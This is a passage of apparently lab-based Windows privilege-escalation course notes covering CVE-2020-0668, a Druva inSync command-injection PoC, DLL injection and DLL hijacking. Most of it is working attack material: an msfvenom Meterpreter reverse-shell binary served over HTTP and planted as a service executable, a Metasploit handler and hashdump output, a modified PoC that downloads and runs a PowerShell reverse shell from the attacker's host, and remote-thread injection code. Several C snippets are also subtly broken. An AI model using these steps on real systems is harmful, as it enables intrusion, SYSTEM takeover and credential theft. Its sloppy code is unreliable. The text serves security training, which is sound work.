Next, let's exploit [Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/), which exploits an arbitrary file move vulnerability leveraging the Windows Service Tracing. Service Tracing allows users to troubleshoot issues with running services and modules by generating debug information. Its parameters are configurable using the Windows registry. Setting a custom MaxFileSize value that is smaller than the size of the file prompts the file to be renamed with a `.OLD` extension when the service is triggered. This move operation is performed by `NT AUTHORITY\SYSTEM`, and can be abused to move a file of our choosing with the help of mount points and symbolic links.
##### Checking Current User Privileges
Let's verify our current user's privileges.
```powershell
whoami /priv # low priv
```
##### After Building Solution
We can use [this](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) exploit for CVE-2020-0668, download it, and open it in Visual Studio within a VM. Building the solution should create the following files.
```cmd
CVE-2020-0668.exe
CVE-2020-0668.exe.config
CVE-2020-0668.pdb
NtApiDotNet.dll
NtApiDotNet.xml
```
At this point, we can use the exploit to create a file of our choosing in a protected folder such as C:\Windows\System32. We aren't able to overwrite any protected Windows files. This privileged file write needs to be chained with another vulnerability, such as [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) or [DiagHub](https://github.com/xct/diaghub) to load the DLL and escalate our privileges. However, the UsoDllLoader technique may not work if Windows Updates are pending or currently being installed, and the DiagHub service may not be available.

We can also look for any third-party software, which can be leveraged, such as the Mozilla Maintenance Service. This service runs in the context of SYSTEM and is startable by unprivileged users. The (non-system protected) binary for this service is located below.

- `C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

##### Checking Permissions on Binary
`icacls` confirms that we only have read and execute permissions on this binary based on the line `BUILTIN\Users:(I)(RX)` in the command output.
```powershell
 icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exBUILTIN\Administrators:(I)(F)
  #  BUILTIN\Users:(I)(RX)
```
##### Generating Malicious Binary
Let's generate a malicious `maintenanceservice.exe` binary that can be used to obtain a Meterpreter reverse shell connection from our target.
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```
##### Hosting the Malicious Binary
We can download it to the target using cURL after starting a Python HTTP server on our attack host like in the `User Account Control` section previously. We can also use wget from the target.
```bash
 python3 -m http.server 8080
```
##### Downloading the Malicious Binary
For this step we need to make two copies of the malicious .exe file. We can just pull it over twice or do it once and make a second copy.

We need to do this because running the exploit corrupts the malicious version of `maintenanceservice.exe` that is moved to (our copy in `c:\Users\htb-student\Desktop` that we are targeting) `c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe` which we will need to account for later. If we attempt to utilize the copied version, we will receive a `system error 216` because the .exe file is no longer a valid binary.
```powershell
wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe
```
##### Running the Exploit
Next, let's run the exploit. It accepts two arguments, the source and destination files.
```powershell
 C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                                      
```
##### Checking Permissions of New File
The exploit runs and executing `icacls` again shows the following entry for our user: `WINLPE-WS02\htb-student:(F)`. This means that our htb-student user has full control over the maintenanceservice.exe binary, and we can overwrite it with a non-corrupted version of our malicious binary.
```bash
icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
 # WS02\htb-student:(F)
```
##### Replacing File with Malicious Binary
We can overwrite the `maintenanceservice.exe` binary in `c:\Program Files (x86)\Mozilla Maintenance Service` with a good working copy of our malicious binary created earlier before proceeding to start the service. In this example, we downloaded two copies of the malicious binary to `C:\Users\htb-student\Desktop`, `maintenanceservice.exe` and `maintenanceservice2.exe`. Let's move the good copy that was not corrupted by the exploit `maintenanceservice2.exe` to the Program Files directory, making sure to rename the file properly and remove the `2` or the service won't start. The `copy` command will only work from a cmd.exe window, not a PowerShell console.

```powershell
copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
##### Metasploit Resource Script
Next, save the below commands to a [Resource Script](https://docs.rapid7.com/metasploit/resource-scripts/) file named `handler.rc`.
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <our_ip>
set LPORT 8443
exploit
```
##### Launching Metasploit with Resource Script
Launch Metasploit using the Resource Script file to preload our settings.

```bash
sudo msfconsole -r handler.rc 

use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
set PAYLOAD windows/x64/meterpreter/reverse_https
PAYLOAD => windows/x64/meterpreter/reverse_https
set LHOST 10.10.14.3
set LPORT 8443
exploit
  # [*] Started HTTPS reverse handler on https://10.10.14.3:8443
```
##### Starting the Service
Start the service, and we should get a session as `NT AUTHORITY\SYSTEM`.
```powershell
net start MozillaMaintenance 
```
##### Receiving a Meterpreter Session
We will get an error trying to start the service but will still receive a callback once the Meterpreter binary executes.

```bash
meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM

meterpreter > hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c93428723187f868ae2f99d4fa66dceb:::
```

## 4- Vulnerable Services
We may be able to escalate privileges on well-patched and well-configured systems if users are permitted to install software or vulnerable third-party applications/services are used throughout the organization. It is common to encounter a multitude of different applications and services on Windows workstations during our assessments. Let's look at an instance of a vulnerable service that we could come across in a real-world environment. Some services/applications may allow us to escalate to SYSTEM. In contrast, others could cause a denial-of-service condition or allow access to sensitive data such as configuration files containing passwords.
#### Enumerating Installed Programs
As covered previously, let's start by enumerating installed applications to get a lay of the land
```powershell
wmic product get name
  # Druva inSync 6.6.3
```
The output looks mostly standard for a Windows 10 workstation. However, the `Druva inSync` application stands out. A quick Google search shows that version `6.6.3` is vulnerable to a command injection attack via an exposed RPC service. We may be able to use [this](https://www.exploit-db.com/exploits/49211) exploit PoC to escalate our privileges. From this [blog post](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/) which details the initial discovery of the flaw, we can see that Druva inSync is an application used for “Integrated backup, eDiscovery, and compliance monitoring,” and the client application runs a service in the context of the powerful `NT AUTHORITY\SYSTEM` account. Escalation is possible by interacting with a service running locally on port 6064.
#### Enumerating Local Ports
Let's do some further enumeration to confirm that the service is running as expected. A quick look with `netstat` shows a service running locally on port `6064`.
```powershell
netstat -ano | findstr 6064
  #   TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324
```
#### Enumerating Process ID
Next, let's map the process ID (PID) `3324` back to the running process.
```powershell
get-process -Id 3324
  # ProcessName: inSyncCPHwnet64
```
#### Druva inSync Windows Client Local Privilege Escalation Example
##### Druva inSync PowerShell PoC
With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.
```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```
#### Modifying PowerShell PoC
For our purposes, we want to modify the `$cmd` variable to our desired command. We can do many things here, such as adding a local admin user (which is a bit noisy, and we want to avoid modifying things on client systems wherever possible) or sending ourselves a reverse shell. Let's try this with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Download the script to our attack box, and rename it something simple like `shell.ps1`. Open the file, and append the following at the bottom of the script file (changing the IP to match our address and listening port as well):
```shell-session
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```
Modify the `$cmd` variable in the Druva inSync exploit PoC script to download our PowerShell reverse shell into memory.
```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```
#### Starting a Python Web Server
Next, start a Python web server in the same directory where our `shell.ps1` script resides.
```shell-session
python3 -m http.server 8080
```
#### Catching a SYSTEM Shell
Finally, start a `Netcat` listener on the attack box and execute the PoC PowerShell script on the target host (after [modifying the PowerShell execution policy](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy) with a command such as `Set-ExecutionPolicy Bypass -Scope Process`). We will get a reverse shell connection back with `SYSTEM` privileges if all goes to plan.
```bash
nc -lvnp 9443
>whoami # nt authority\system
```
### Moving On
This example shows just how risky it can be to allow users to install software on their machines and how we should always enumerate installed software if we land on a Windows server or desktop host. Organizations should restrict local administrator rights on end-user machines following the principle of least privilege. Furthermore, an application whitelisting tool can help ensure that only properly vetted software is installed on user workstations.


---
## 5- DLL Injection
`DLL injection` is a method that involves inserting a piece of code, structured as a Dynamic Link Library (DLL), into a running process. This technique allows the inserted code to run within the process's context, thereby influencing its behavior or accessing its resources.

`DLL injection` finds legitimate applications in various areas. For instance, software developers leverage this technology for `hot patching`, a method that enables the amendment or updating of code seamlessly, without the need to restart the ongoing process immediately. A prime example of this is [Azure's use of hot patching for updating operational servers](https://learn.microsoft.com/en-us/azure/automanage/automanage-hotpatch#how-hotpatch-works), which facilitates the benefits of the update without necessitating server downtime.

Nevertheless, it's not entirely innocuous. Cybercriminals often manipulate `DLL injection` to insert malicious code into trusted processes. This technique is particularly effective in evading detection by security software.

There are several different methods for actually executing a DLL injection.
#### LoadLibrary
`LoadLibrary` is a widely utilized method for DLL injection, employing the `LoadLibrary` API to load the DLL into the target process's address space.

The `LoadLibrary` API is a function provided by the Windows operating system that loads a Dynamic Link Library (DLL) into the current process’s memory and returns a handle that can be used to get the addresses of functions within the DLL.
```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary to load a DLL into the current process
    HMODULE hModule = LoadLibrary("example.dll");
    if (hModule == NULL) {
        printf("Failed to load example.dll\n");
        return -1;
    }
    printf("Successfully loaded example.dll\n");

    return 0;
}
```
The first example shows how `LoadLibrary` can be used to load a DLL into the current process legitimately.

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456 // The ID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}
```
The second example illustrates the use of `LoadLibrary` for DLL injection. This process involves allocating memory within the target process for the DLL path and then initiating a remote thread that begins at `LoadLibrary` and directs towards the DLL path.

#### Manual Mapping
`Manual Mapping` is an incredibly complex and advanced method of DLL injection. It involves the manual loading of a DLL into a process's memory and resolves its imports and relocations. However, it avoids easy detection by not using the `LoadLibrary` function, whose usage is monitored by security and anti-cheat systems.

A simplified outline of the process can be represented as follows:

1. Load the DLL as raw data into the injecting process.
2. Map the DLL sections into the targeted process.
3. Inject shellcode into the target process and execute it. This shellcode relocates the DLL, rectifies the imports, executes the Thread Local Storage (TLS) callbacks, and finally calls the DLL main.

#### Reflective DLL Injection
`Reflective DLL injection` is a technique that utilizes reflective programming to load a library from memory into a host process. The library itself is responsible for its loading process by implementing a minimal Portable Executable (PE) file loader. This allows it to decide how it will load and interact with the host, minimising interaction with the host system and process.

[Stephen Fewer has a great GitHub](https://github.com/stephenfewer/ReflectiveDLLInjection) demonstrating the technique. Borrowing his explanation below:

"The procedure of remotely injecting a library into a process is two-fold. First, the library you aim to inject must be written into the target process’s address space (hereafter referred to as the 'host process'). Second, the library must be loaded into the host process to meet the library's runtime expectations, such as resolving its imports or relocating it to an appropriate location in memory.

Assuming we have code execution in the host process and the library we aim to inject has been written into an arbitrary memory location in the host process, Reflective DLL Injection functions as follows.

1. Execution control is transferred to the library's `ReflectiveLoader` function, an exported function found in the library's export table. This can happen either via `CreateRemoteThread()` or a minimal bootstrap shellcode.
2. As the library's image currently resides in an arbitrary memory location, the `ReflectiveLoader` initially calculates its own image's current memory location to parse its own headers for later use.
3. The `ReflectiveLoader` then parses the host process's `kernel32.dll` export table to calculate the addresses of three functions needed by the loader, namely `LoadLibraryA`, `GetProcAddress`, and `VirtualAlloc`.
4. The `ReflectiveLoader` now allocates a continuous memory region where it will proceed to load its own image. The location isn't crucial; the loader will correctly relocate the image later.
5. The library's headers and sections are loaded into their new memory locations.
6. The `ReflectiveLoader` then processes the newly loaded copy of its image's import table, loading any additional libraries and resolving their respective imported function addresses.
7. The `ReflectiveLoader` then processes the newly loaded copy of its image's relocation table.
8. The `ReflectiveLoader` then calls its newly loaded image's entry point function, `DllMain,` with `DLL_PROCESS_ATTACH`. The library has now been successfully loaded into memory.
9. Finally, the `ReflectiveLoader` returns execution to the initial bootstrap shellcode that called it, or if it were called via `CreateRemoteThread`, the thread would terminate."
#### DLL Hijacking

`DLL Hijacking` is an exploitation technique where an attacker capitalizes on the Windows DLL loading process. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn't specify the full path to a required DLL, hence rendering it susceptible to such attacks.

The default DLL search order used by the system depends on whether `Safe DLL Search Mode` is activated. When enabled (which is the default setting), Safe DLL Search Mode repositions the user's current directory further down in the search order. It’s easy to either enable or disable the setting by editing the registry.

1. Press `Windows key + R` to open the Run dialog box.
2. Type in `Regedit` and press `Enter`. This will open the Registry Editor.
3. Navigate to `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager`.
4. In the right pane, look for the `SafeDllSearchMode` value. If it does not exist, right-click the blank space of the folder or right-click the `Session Manager` folder, select `New` and then `DWORD (32-bit) Value`. Name this new value as `SafeDllSearchMode`.
5. Double-click `SafeDllSearchMode`. In the Value data field, enter `1` to enable and `0` to disable Safe DLL Search Mode.
6. Click `OK`, close the Registry Editor and Reboot the system for the changes to take effect.

With this mode enabled, applications search for necessary DLL files in the following sequence:

1. The directory from which the application is loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.

However, if 'Safe DLL Search Mode' is deactivated, the search order changes to:

1. The directory from which the application is loaded.
2. The current directory.
3. The system directory.
4. The 16-bit system directory.
5. The Windows directory
6. The directories that are listed in the PATH environment variable

DLL Hijacking involves a few more steps. First, you need to pinpoint a DLL the target is attempting to locate. Specific tools can simplify this task:

1. `Process Explorer`: Part of Microsoft's Sysinternals suite, this tool offers detailed information on running processes, including their loaded DLLs. By selecting a process and inspecting its properties, you can view its DLLs.
2. `PE Explorer`: This Portable Executable (PE) Explorer can open and examine a PE file (such as a .exe or .dll). Among other features, it reveals the DLLs from which the file imports functionality.

After identifying a DLL, the next step is determining which functions you want to modify, which necessitates reverse engineering tools, such as disassemblers and debuggers. Once the functions and their signatures have been identified, it's time to construct the DLL.

Let’s take a practical example. Consider the C program below:
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <windows.h>

typedef int (*AddFunc)(int, int);

int readIntegerInput()
{
    int value;
    char input[100];
    bool isValid = false;

    while (!isValid)
    {
        fgets(input, sizeof(input), stdin);

        if (sscanf(input, "%d", &value) == 1)
        {
            isValid = true;
        }
        else
        {
            printf("Invalid input. Please enter an integer: ");
        }
    }

    return value;
}

int main()
{
    HMODULE hLibrary = LoadLibrary("library.dll");
    if (hLibrary == NULL)
    {
        printf("Failed to load library.dll\n");
        return 1;
    }

    AddFunc add = (AddFunc)GetProcAddress(hLibrary, "Add");
    if (add == NULL)
    {
        printf("Failed to locate the 'Add' function\n");
        FreeLibrary(hLibrary);
        return 1;
    }
    HMODULE hLibrary = LoadLibrary("x.dll");

    printf("Enter the first number: ");
    int a = readIntegerInput();

    printf("Enter the second number: ");
    int b = readIntegerInput();

    int result = add(a, b);
    printf("The sum of %d and %d is %d\n", a, b, result);

    FreeLibrary(hLibrary);
    system("pause");
    return 0;
}
```
It loads an `add` function from the `library.dll` and utilises this function to add two numbers. Subsequently, it prints the result of the addition. By examining the program in Process Monitor (procmon), we can observe the process of loading the `library.dll` located in the same directory.

First, let's set up a filter in procmon to solely include `main.exe`, which is the process name of the program. This filter will help us focus specifically on the activities related to the execution of `main.exe`. It is important to note that procmon only captures information while it is actively running. Therefore, if your log appears empty, you should close `main.exe` and reopen it while procmon is running. This will ensure that the necessary information is captured and available for analysis.
![[Pasted image 20260116200238.png]]
Then if you scroll to the bottom, you can see the call to load `library.dll`.
![[Pasted image 20260116200251.png]]
We can further filter for an `Operation` of `Load Image` to only get the libraries the app is loading.
```shell-session
16:13:30,0074709	main.exe	47792	Load Image	C:\Users\PandaSt0rm\Desktop\Hijack\main.exe	SUCCESS	Image Base: 0xf60000, Image Size: 0x26000
16:13:30,0075369	main.exe	47792	Load Image	C:\Windows\System32\ntdll.dll	SUCCESS	Image Base: 0x7ffacdbf0000, Image Size: 0x214000
16:13:30,0075986	main.exe	47792	Load Image	C:\Windows\SysWOW64\ntdll.dll	SUCCESS	Image Base: 0x77a30000, Image Size: 0x1af000
16:13:30,0120867	main.exe	47792	Load Image	C:\Windows\System32\wow64.dll	SUCCESS	Image Base: 0x7ffacd5a0000, Image Size: 0x57000
16:13:30,0122132	main.exe	47792	Load Image	C:\Windows\System32\wow64base.dll	SUCCESS	Image Base: 0x7ffacd370000, Image Size: 0x9000
16:13:30,0123231	main.exe	47792	Load Image	C:\Windows\System32\wow64win.dll	SUCCESS	Image Base: 0x7ffacc750000, Image Size: 0x8b000
16:13:30,0124204	main.exe	47792	Load Image	C:\Windows\System32\wow64con.dll	SUCCESS	Image Base: 0x7ffacc850000, Image Size: 0x16000
16:13:30,0133468	main.exe	47792	Load Image	C:\Windows\System32\wow64cpu.dll	SUCCESS	Image Base: 0x77a20000, Image Size: 0xa000
16:13:30,0144586	main.exe	47792	Load Image	C:\Windows\SysWOW64\kernel32.dll	SUCCESS	Image Base: 0x76460000, Image Size: 0xf0000
16:13:30,0146299	main.exe	47792	Load Image	C:\Windows\SysWOW64\KernelBase.dll	SUCCESS	Image Base: 0x75dd0000, Image Size: 0x272000
16:13:31,7974779	main.exe	47792	Load Image	C:\Users\PandaSt0rm\Desktop\Hijack\library.dll	SUCCESS	Image Base: 0x6a1a0000, Image Size: 0x1d000
```
##### Proxying

1. Create a new library: We will create a new library serving as the proxy for `library.dll`. This library will contain the necessary code to load the `Add` function from `library.dll` and perform the required tampering.
2. Load the `Add` function: Within the new library, we will load the `Add` function from the original `library.dll`. This will allow us to access the original function.
3. Tamper with the function: Once the `Add` function is loaded, we can then apply the desired tampering or modifications to its result. In this case, we are simply going to modify the result of the addition, to add `+ 1` to the result.
4. Return the modified function: After completing the tampering process, we will return the modified `Add` function from the new library back to `main.exe`. This will ensure that when `main.exe` calls the `Add` function, it will execute the modified version with the intended changes.


Code: c

```c
// tamper.c
#include <stdio.h>
#include <Windows.h>

#ifdef _WIN32
#define DLL_EXPORT __declspec(dllexport)
#else
#define DLL_EXPORT
#endif

typedef int (*AddFunc)(int, int);

DLL_EXPORT int Add(int a, int b)
{
    // Load the original library containing the Add function
    HMODULE originalLibrary = LoadLibraryA("library.o.dll");
    if (originalLibrary != NULL)
    {
        // Get the address of the original Add function from the library
        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
        if (originalAdd != NULL)
        {
            printf("============ HIJACKED ============\n");
            // Call the original Add function with the provided arguments
            int result = originalAdd(a, b);
            // Tamper with the result by adding +1
            printf("= Adding 1 to the sum to be evil\n");
            result += 1;
            printf("============ RETURN ============\n");
            // Return the tampered result
            return result;
        }
    }
    // Return -1 if the original library or function cannot be loaded
    return -1;
}
```

Either compile it or use the precompiled version provided. Rename `library.dll` to `library.o.dll`, and rename `tamper.dll` to `library.dll`.

Running `main.exe` then shows the successful hack.
![[Pasted image 20260116200430.png]]
##### Invalid Libraries

Another option to execute a DLL Hijack attack is to replace a valid library the program is attempting to load but cannot find with a crafted library. If we change the procmon filter to focus on entries whose path ends in `.dll` and has a status of `NAME NOT FOUND` we can find such libraries in `main.exe`.
![[Pasted image 20260116200520.png]]
As we know, `main.exe` searches in many locations looking for `x.dll`, but it doesn’t find it anywhere. The entry we are particularly interested in is:
```shell-session
17:55:39,7848570	main.exe	37940	CreateFile	C:\Users\PandaSt0rm\Desktop\Hijack\x.dll	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
```
Where it is looking to load `x.dll` from the app directory. We can take advantage of this and load our own code, with very little context of what it is looking for in `x.dll`.
```c
#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        printf("Hijacked... Oops...\n");
    }
    break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
```
This code defines a DLL entry point function called `DllMain` that is automatically called by Windows when the DLL is loaded into a process. When the library is loaded, it will simply print `Hijacked... Oops...` to the terminal, but you could theoretically do anything here.

Either compile it or use the precompiled version provided. Rename `hijack.dll` to `x.dll`, and run `main.exe`.
![[Pasted image 20260116200554.png]]


